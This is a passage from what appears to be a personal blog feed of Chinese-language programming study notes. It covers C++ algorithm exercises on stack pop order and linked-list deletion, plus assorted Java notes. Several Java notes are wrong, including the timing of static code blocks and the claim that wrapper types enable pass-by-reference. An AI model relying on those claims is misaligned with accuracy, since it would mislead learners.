class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : popV) &#123;<br>            <span class="hljs-keyword">while</span> (j &lt; n &amp;&amp; (stack.<span class="hljs-built_in">empty</span>() || stack.<span class="hljs-built_in">top</span>() != item)) &#123;<br>                stack.<span class="hljs-built_in">push</span>(pushV[j++]);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (stack.<span class="hljs-built_in">top</span>() == item) &#123;<br>                stack.<span class="hljs-built_in">pop</span>();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>方法二（自写）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsPopOrder</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; pushV, vector&lt;<span class="hljs-type">int</span>&gt; popV)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (pushV.<span class="hljs-built_in">size</span>() != popV.<span class="hljs-built_in">size</span>()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; pushV.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-keyword">while</span> (i &lt; pushV.<span class="hljs-built_in">size</span>() &amp;&amp;i &gt;= <span class="hljs-number">0</span>&amp;&amp; pushV[i] == popV[j] ) &#123;<br>                pushV.<span class="hljs-built_in">erase</span>(pushV.<span class="hljs-built_in">begin</span>() + i);<br>                i--;<br>                j++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (popV.<span class="hljs-built_in">size</span>() == j) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure></li><li><p>提示</p><p>方法一：</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%92%8C%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97.gif"></p><p>方法二：</p><ol><li>遍历<code>push</code>，如果当发现<code>push</code>的元素与<code>pop</code>的元素相等的话，我们就选择将这个<code>push</code>元素<code>erase</code>,并且将下标往前移动一，也就是<code>i--</code></li><li>如果发现<code>pop</code>也都遍历完了，我们就<code>return</code>成功。如果<code>push</code>的下标超过了<code>push.size()</code>我们就选择<code>return false</code></li></ol></li><li><p>理解</p><p>方法一</p><ul><li><p>确保push遍历完时，还可以遍历pop，所以采取遍历pop的方式</p></li><li><p>借助辅助栈，对比是否出栈的顺序是否一致</p></li><li><p>整体的思路如下</p><p>当push没有遍历完，且栈是空或者栈顶不和pop一致，应该往栈push</p><p>如果发现栈顶的值与pop的一致，应该跳出循环，并将栈顶的元素弹出</p><p>如果当push走完时，栈顶元素不和pop相等则说明不相等</p></li><li><p>当两个vector都遍历完时，则说明序列一致</p></li></ul><p>方法二</p><ul><li>将<code>push</code>拿来遍历，如果push都走完了，我们的<code>pop</code>还没走完就选择<code>return false</code></li><li>如果<code>size</code>都不相等，就像应该直接返回<code>false</code></li></ul></li><li><p>问题</p><p>方法一</p><ul><li><p>如何确保push完全走完</p><blockquote><p>循环遍历pop</p></blockquote></li></ul><p>方法二</p><ul><li><p>如何防止<code>popV</code>越界</p><blockquote><p>使用i&gt;&#x3D;0，如果该条件不满足，则说明已经遍历完成</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>删除链表结点</title>
    <link href="/2023/04/12/%E7%AE%97%E6%B3%95/newcoder/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%BB%93%E7%82%B9/"/>
    <url>/2023/04/12/%E7%AE%97%E6%B3%95/newcoder/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E7%BB%93%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/f9f78ca89ad643c99701a7142bd59f5d?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">删除链表的节点_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E9%93%BE%E8%A1%A8/%E5%88%A0%E9%99%A4%E8%8A%82%E7%82%B9.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *  int val;</span><br><span class="hljs-comment"> *  struct ListNode *next;</span><br><span class="hljs-comment"> *  ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstddef&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param head ListNode类</span><br><span class="hljs-comment">     * @param val int整型</span><br><span class="hljs-comment">     * @return ListNode类</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">ListNode* <span class="hljs-title">deleteNode</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        ListNode* dummy=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">-1</span>);<br>        dummy-&gt;next=head;<br>        ListNode* moveNode=dummy;<br>        <span class="hljs-keyword">while</span>(moveNode-&gt;next!=<span class="hljs-literal">nullptr</span>)&#123;<br>            <span class="hljs-keyword">if</span>(moveNode-&gt;next-&gt;val==val)<br>            &#123;<br>                moveNode-&gt;next=moveNode-&gt;next-&gt;next;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            moveNode=moveNode-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dummy-&gt;next;<br><br>        <span class="hljs-comment">/*        ListNode* moveNode = head;</span><br><span class="hljs-comment">                ListNode* pre=head;</span><br><span class="hljs-comment">                if(head-&gt;val==val)&#123;</span><br><span class="hljs-comment">                    return head-&gt;next;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">                while (moveNode != nullptr) &#123;</span><br><span class="hljs-comment">                    if (moveNode-&gt;val == val) &#123;</span><br><span class="hljs-comment">                        pre-&gt;next=moveNode-&gt;next;</span><br><span class="hljs-comment">                        moveNode = moveNode-&gt;next;</span><br><span class="hljs-comment">                        break;</span><br><span class="hljs-comment">                    &#125;</span><br><span class="hljs-comment">                    pre=moveNode;</span><br><span class="hljs-comment">                    moveNode = moveNode-&gt;next;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">                return head;*/</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>注释是自己的方法</p></li><li><p>提示</p><ul><li>对来链表操作，或者返回链表的使用虚拟头节点</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java随记</title>
    <link href="/2023/04/12/java/java%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/04/12/java/java%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>java的初始化</p><p>Java的初始化是指在创建对象时为其成员变量设定初值的过程。Java中的所有对象在创建时，其成员变量都会被默认初始化为其对应类型的默认值（如int类型的默认值为0，引用类型的默认值为null）。如果需要对成员变量进行显式初始化，可以通过构造函数、代码块或直接赋值的方式实现。</p><p>构造函数是一种特殊的方法，用于在创建对象时执行一些初始化操作。在Java中，每个类都有一个与之同名的构造函数，可以通过这个构造函数来初始化对象的成员变量。如果没有定义构造函数，Java会提供一个默认构造函数，但是默认构造函数不会做任何事情。</p><p>除了构造函数，Java还提供了代码块的概念。<strong>代码块分为静态代码块和非静态代码块。静态代码块在类加载时执行，非静态代码块在每次创建对象时都会执行。代码块中的语句可以用来初始化成员变量。</strong></p></li><li><p><code>java</code>获得数组的长度使用<code>arr.length</code></p><p>在Java中，数组有一个属性 length，用于表示数组的长度。在本题中，数组 arr 的长度为 10，可以使用 <code>arr.length</code> 来获得数组的长度。注意，这里的 length 不是方法，而是成员变量，因此无需使用括号表示。</p></li><li><p><code>string.concat()</code> 将两个字符串连在一起，返回新的字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;World&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">str3</span> <span class="hljs-operator">=</span> str1.concat(str2);<br>System.out.println(str3);<br></code></pre></td></tr></table></figure></li><li><p>java什么时候传形参，什么时候传引用？</p><p>在Java中，所有基本类型（如 int、double、boolean 等）都是按值传递的，也就是说，在将基本类型作为参数传递给方法时，实际上传递的是该基本类型的值的副本。任何对这个副本的修改都不会影响到原始的基本类型变量。</p><p>而对于对象类型，Java传递的则是对象引用的副本。对象引用是一个存储在栈内存中的值，它指向堆内存中的一个对象。当将一个对象作为参数传递给方法时，实际上传递的是该对象引用的副本，也就是说，传递的是一个指向原始对象的副本。这种方式称为按引用传递。</p><p>虽然 Java 使用的是按值传递的机制，但因为对象引用传递的实现方式，使得在方法内部可以修改该对象的状态，例如通过调用对象的 setter 方法改变其属性值，或通过调用对象的方法改变其内部状态等。此时，由于传递的是对象的引用，方法内部的修改也会影响原始对象。</p><p>需要注意的是，在 Java 中不支持传递引用的方式，如果想要实现类似 C++ 中的传递引用，则需要使用 Java 的封装类型（例如 Integer、Double、Boolean 等）。这些类型都是对象类型，因此在传递这些类型的变量时，实际上是传递了对象引用的副本，因此也可以在方法内部修改其状态。</p></li><li><p><code>substring(1,5)</code></p><p>获取字符串中第1个元素到到5前一个元素</p></li><li><p>构造方法不能是静态的</p></li><li><p>使用<code>javac</code>将<code>java</code>文件编译成<code>.class</code>文件</p><p>使用<code>java</code> 运行文件</p></li><li><p><code>java</code>代码块</p><ul><li><p>静态代码块</p><p>只在类的加载时执行一次</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span>&#123;<br>    <span class="hljs-comment">//初始化static 变量</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>构造代码块</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-comment">//每次类的加载都会执行</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>局部代码块</p><p>用于限定生命周期</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> func&#123;<br>    &#123;<br>        <span class="hljs-type">int</span> num;<br>        <span class="hljs-comment">//限制num的生命周期</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>同步代码块</p><p>确保线程安全</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">// 同步方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizedMethod</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 同步代码块，保证线程安全</span><br>        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>            <span class="hljs-comment">// do something</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>Math类</p><ol><li><code>abs()</code>：返回一个数的绝对值。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>ceil()</code>：返回大于或等于参数的最小整数，即向上取整。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>floor()</code>：返回小于或等于参数的最大整数，即向下取整。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>round()</code>：返回四舍五入后的最接近的整数。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>max()</code>：返回两个值中较大的那个。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>min()</code>：返回两个值中较小的那个。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>pow(double a, double b)</code>：返回a的b次幂。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>sqrt()</code>：返回一个数的平方根。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li><li><code>sin()</code>：返回一个角度的正弦值。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/sin">2</a>]</li><li><code>cos()</code>：返回一个角度的余弦值。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/cos">2</a>]</li><li><code>tan()</code>：返回一个角度的正切值。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/tan">2</a>]</li><li><code>asin()</code>：返回一个数值的反正弦值（单位为弧度）。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/asin">2</a>]</li><li><code>acos()</code>：返回一个数值的反余弦值（单位为弧度）。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/acos">2</a>]</li><li><code>atan()</code>：返回一个数值的反正切值（单位为弧度）。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/atan">2</a>]</li><li><code>exp()</code>：返回 <code>Math.E</code>（自然对数的底数）的指数。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/exp">2</a>]</li><li><code>log()</code>：返回一个数的自然对数（以e为底数）。[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math/log">2</a>]</li><li><code>random()</code>：返回一个随机数，范围为0到1。[<a href="https://www.w3schools.com/java/ref_math.asp">1</a>]</li></ol></li><li><p><code>java</code>使用代码块对static变量进行赋值和直接赋值的区别？</p></li><li><p>执行时机</p><p>直接给static变量赋值时，赋值操作会在类加载时执行，也就是说，当 JVM 加载该类时，就会把static变量的初始值存储到内存中。</p><p>   而代码块则需要等到该类被实例化时才会执行。也就是说，当该类被使用时，代码块中的语句才会执行，从而给static变量赋值。</p></li><li><p>赋值方式</p><p>直接给static变量赋值是一种简单的方式，它可以直接在变量后跟一个等号，然后紧接着赋值的表达式。</p><p>   而代码块提供了更多灵活的赋值方式，我们可以在代码块中编写任意复杂的逻辑来计算出static变量的值，更加符合面向对象的设计思想。</p><p>   综合来看，我们可以根据具体的场景选择不同的方式对static变量进行赋值。如果我们需要简单地给变量赋一个常量值，那么可以直接使用赋值操作；如果我们需要进行一些特殊的计算，或者需要依赖其他变量的值来计算static变量的值，那么可以使用代码块来进行赋值。</p></li><li><p>使用<code>scanner</code>输入字符的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.println(<span class="hljs-string">&quot;请输入一个字符：&quot;</span>);<br><span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> scanner.next().charAt(<span class="hljs-number">0</span>);<br>System.out.println(<span class="hljs-string">&quot;您输入的字符是：&quot;</span> + c);<br></code></pre></td></tr></table></figure></li><li><p>关于线程</p><p>多线程是指将CPU资源按时间片分配到多个任务上，看似并行工作，实质上在同一时刻只有一个线程在工作；在一段时间之内，是多个线程在同时工作。</p></li><li><p>不含公共类的文件命名</p><p>不含公共类的Java源文件的命名可以使用任何合法的标识符来命名，但必须以<code>.java</code>文件扩展名结尾。这个文件名称一般会反映该文件中定义的类的用途。</p></li><li><p>在Windows操作系统和Linux操作系统运行的JAVA虚拟机没有什么差别</p></li><li><p>在 Java 中，<code>&amp;&amp;</code> 和 <code>||</code> 是短路逻辑运算符（short-circuit logical operators），而 <code>&amp;</code> 和 <code>|</code> 是非短路逻辑运算符（non-short-circuit logical operators）。</p><p>短路逻辑运算符表示当进行逻辑运算时，如果根据前面的条件可以确定整个表达式的值，后面的条件就不会被判断。例如，对于表达式 <code>A &amp;&amp; B</code>，如果 <code>A</code> 的值为 <code>false</code>，则整个表达式的值一定是 <code>false</code>，因此不会再去判断 <code>B</code> 的值。同理，对于表达式 <code>A || B</code>，如果 <code>A</code> 的值为 <code>true</code>，则整个表达式的值一定是 <code>true</code>，因此不会再去判断 <code>B</code> 的值。</p></li><li><p>Java中二维数组既可以表示m行n列的规则数据，也可以表示多行数据，每一行的列数不相同的不规则数组。</p></li><li><p><code>java</code>不定长度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">average</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>        sum += num;<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-type">double</span>) sum / nums.length;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p><code>java </code>栈的相关操作</p><ol><li>push(E item)：将元素item压入栈顶。</li><li>pop()：弹出栈顶元素，并返回该元素。</li><li>peek()：返回当前栈顶元素，但不对栈做任何修改。</li><li>empty()：测试栈是否为空，如果为空返回true，否则返回false。</li><li>search(Object o)：查找元素o在栈中的位置，如果存在返回距离栈顶的位置索引，否则返回-1。</li></ol></li><li><p><code>java</code>枚举<code>enum</code></p><p>用于常量的定义</p></li><li><p><code>substring</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">substring(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><p>左闭右开</p><p>从第三个开始，包含第三个，第四个结束不包含第四个</p></li><li><p><code>StringBuffer</code>不能直接给<code>String</code>赋值，必须使用<code>toString()</code></p></li><li><p>常用的Arrays类静态方法有：</p><ul><li>sort方法：对数组进行排序</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] nums = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>&#125;;<br>Arrays.sort(nums); <span class="hljs-comment">// 对nums数组进行升序排序</span><br>System.out.println(Arrays.toString(nums)); <span class="hljs-comment">// [1, 3, 4]</span><br></code></pre></td></tr></table></figure><ul><li>binarySearch方法：在已排序的数组中查找指定元素并返回其下标</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] nums = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> Arrays.binarySearch(nums, <span class="hljs-number">3</span>); <span class="hljs-comment">// 在nums数组中查找数字3</span><br>System.out.println(index); <span class="hljs-comment">// 2，即数字3在数组中的下标为2</span><br></code></pre></td></tr></table></figure><ul><li>equals方法：比较两个数组是否相等</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] a = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span>[] b = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isEqual</span> <span class="hljs-operator">=</span> Arrays.equals(a, b); <span class="hljs-comment">// 判断a和b数组是否相等</span><br>System.out.println(isEqual); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><ul><li>fill方法：将数组全部填充为指定值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] nums = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">5</span>];<br>Arrays.fill(nums, <span class="hljs-number">4</span>); <span class="hljs-comment">// 将nums数组全部填充为数字4</span><br>System.out.println(Arrays.toString(nums)); <span class="hljs-comment">// [4, 4, 4, 4, 4]</span><br></code></pre></td></tr></table></figure><ul><li>copyOf方法：复制一个数组的一部分或全部到一个新数组中</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] a = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span>[] b = Arrays.copyOf(a, <span class="hljs-number">3</span>); <span class="hljs-comment">// 复制a数组的前3个元素到b数组中</span><br>System.out.println(Arrays.toString(b)); <span class="hljs-comment">// [1, 2, 3]</span><br></code></pre></td></tr></table></figure><ul><li>toString方法：将数组转换为字符串输出</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">int</span>[] nums = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br>System.out.println(Arrays.toString(nums)); <span class="hljs-comment">// [1, 2, 3]</span><br></code></pre></td></tr></table></figure></li><li><p>常用的Character类静态方法有：</p><ul><li>isLetter方法：判断字符是否为字母（大小写均可）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;A&#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isLetter</span> <span class="hljs-operator">=</span> Character.isLetter(c); <span class="hljs-comment">// 判断c是否是字母</span><br>System.out.println(isLetter); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><ul><li>isDigit方法：判断字符是否为数字</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;5&#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isDigit</span> <span class="hljs-operator">=</span> Character.isDigit(c); <span class="hljs-comment">// 判断c是否是数字</span><br>System.out.println(isDigit); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><ul><li>toUpperCase方法：将字符转换为大写字母</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">upperCaseC</span> <span class="hljs-operator">=</span> Character.toUpperCase(c); <span class="hljs-comment">// 将小写字母c转换为大写字母</span><br>System.out.println(upperCaseC); <span class="hljs-comment">// A</span><br></code></pre></td></tr></table></figure><ul><li>toLowerCase方法：将字符转换为小写字母</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;B&#x27;</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">lowerCaseC</span> <span class="hljs-operator">=</span> Character.toLowerCase(c); <span class="hljs-comment">// 将大写字母B转换为小写字母</span><br>System.out.println(lowerCaseC); <span class="hljs-comment">// b</span><br></code></pre></td></tr></table></figure><ul><li>isWhitespace方法：判断字符是否为空格字符</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27; &#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isWhitespace</span> <span class="hljs-operator">=</span> Character.isWhitespace(c); <span class="hljs-comment">// 判断c是否是空格字符</span><br>System.out.println(isWhitespace); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><ul><li>isLetterOrDigit方法：判断字符是否为字母或数字</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java复制代码<span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;+&#x27;</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isLetterOrDigit</span> <span 